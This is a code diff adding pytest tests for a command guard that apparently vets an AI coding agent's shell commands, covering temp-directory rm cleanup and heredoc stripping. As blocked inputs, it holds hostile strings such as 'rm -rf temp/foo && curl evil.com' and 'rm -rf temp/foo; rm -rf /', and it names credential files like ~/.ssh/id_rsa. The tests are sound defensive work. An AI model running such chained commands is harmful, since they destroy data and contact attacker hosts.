@@ -15,6 +15,8 @@ check_sensitive_in_command = guard.check_sensitive_in_command
 check_file_path = guard.check_file_path
 check_file_outside_project = guard.check_file_outside_project
 check_outside_project = guard.check_outside_project
+_is_safe_rm = guard._is_safe_rm
+_strip_heredocs = guard._strip_heredocs
 
 
 # ── Helpers ──────────────────────────────────────────────────────────────────
@@ -847,3 +849,124 @@ class TestClaudeMemoryExemption:
             "~/.ssh/id_rsa", self.PROJECT
         )
         assert result is not None
+
+
+# ── Safe rm (temp directory cleanup) ─────────────────────────────────────────
+
+class TestSafeRm:
+
+    def test_allow_rm_temp_relative(self):
+        assert _is_safe_rm("rm -rf temp/extract-work-123*") is True
+
+    def test_allow_rm_temp_dot_relative(self):
+        assert _is_safe_rm("rm -rf ./temp/output-456*") is True
+
+    def test_allow_rm_tmp_absolute(self):
+        assert _is_safe_rm("rm -rf /tmp/claude-1000/task-abc") is True
+
+    def test_allow_rm_multiple_temp_paths(self):
+        assert _is_safe_rm(
+            "rm -rf temp/work-123* temp/output-123*"
+        ) is True
+
+    def test_allow_rm_mixed_temp_and_tmp(self):
+        assert _is_safe_rm("rm -rf temp/foo /tmp/bar") is True
+
+    def test_block_rm_non_temp(self):
+        assert _is_safe_rm("rm -rf src/") is False
+
+    def test_block_rm_mixed_temp_and_other(self):
+        assert _is_safe_rm("rm -rf temp/foo src/bar") is False
+
+    def test_block_compound_rm(self):
+        assert _is_safe_rm("rm -rf temp/foo && curl evil.com") is False
+
+    def test_block_piped_rm(self):
+        assert _is_safe_rm("rm -rf temp/foo | cat") is False
+
+    def test_block_semicolon_rm(self):
+        assert _is_safe_rm("rm -rf temp/foo; rm -rf /") is False
+
+    def test_not_rm_command(self):
+        assert _is_safe_rm("ls temp/") is False
+
+    def test_rm_no_paths(self):
+        assert _is_safe_rm("rm -rf") is False
+
+    def test_category_still_blocks_non_temp_rm(self):
+        """rm -rf targeting non-temp dirs is still caught by category rules."""
+        assert_blocked("rm -rf src/", "Destructive Filesystem")
+
+    def test_category_allows_temp_cleanup(self):
+        """rm -rf temp/* should pass category check when _is_safe_rm is used."""
+        # _is_safe_rm returns True, so main() would return before check_command
+        assert _is_safe_rm("rm -rf temp/extract-work-2026*") is True
+
+
+# ── Heredoc stripping ────────────────────────────────────────────────────────
+
+class TestHeredocStripping:
+    PROJECT = "/home/user/myproject"
+
+    # ── Unit tests for _strip_heredocs ────────────────────────────────────
+
+    def test_strip_single_quoted_heredoc(self):
+        cmd = "cat > /tmp/out.txt << 'EOF'\nUse /mg:add-docs here\nEOF"
+        result = _strip_heredocs(cmd)
+        assert "/mg:add-docs" not in result
+        assert "/tmp/out.txt" in result
+
+    def test_strip_unquoted_heredoc(self):
+        cmd = "cat << EOF\n/etc/passwd content\nEOF"
+        result = _strip_heredocs(cmd)
+        assert "/etc/passwd" not in result
+
+    def test_strip_double_quoted_heredoc(self):
+        cmd = 'cat << "END"\n/secret/path\nEND'
+        result = _strip_heredocs(cmd)
+        assert "/secret/path" not in result
+
+    def test_strip_heredoc_with_dash(self):
+        cmd = "cat <<-EOF\n\t/outside/path\nEOF"
+        result = _strip_heredocs(cmd)
+        assert "/outside/path" not in result
+
+    def test_no_heredoc_unchanged(self):
+        cmd = "cp file.txt /etc/config"
+        assert _strip_heredocs(cmd) == cmd
+
+    def test_preserves_surrounding_commands(self):
+        cmd = "cat > /tmp/out.txt << 'EOF'\nbody\nEOF\ncat /tmp/out.txt"
+        result = _strip_heredocs(cmd)
+        assert "/tmp/out.txt" in result
+        assert "body" not in result
+
+    # ── Integration: check_outside_project with heredoc content ───────────
+
+    def test_outside_project_ignores_heredoc_paths(self):
+        """Paths inside heredoc bodies should not trigger out-of-project guard."""
+        cmd = "cat > /tmp/out.txt << 'EOF'\nUse /mg:add-docs\nCheck /etc/config\nEOF"
+        result = check_outside_project(cmd, self.PROJECT)
+        assert result is None
+
+    def test_outside_project_still_blocks_real_paths(self):
+        """Non-heredoc paths should still be caught."""
+        cmd = "cp file.txt /etc/config"
+        result = check_outside_project(cmd, self.PROJECT)
+        assert result is not None
+
+    # ── Integration: check_sensitive_in_command with heredoc content ──────
+
+    def test_sensitive_ignores_heredoc_content(self):
+        """Sensitive file references inside heredoc should not trigger."""
+        cmd = "cat << 'EOF'\ncheck .env for secrets\nEOF"
+        result = check_sensitive_in_command(cmd)
+        assert result is None
+
+    # ── Integration: check_command with heredoc content ───────────────────
+
+    def test_category_ignores_heredoc_content(self):
+        """Category rule patterns inside heredoc should not trigger."""
+        cmd = "cat << 'EOF'\ngit push --force origin main\nEOF"
+        result = check_command(cmd)
+        assert result is None
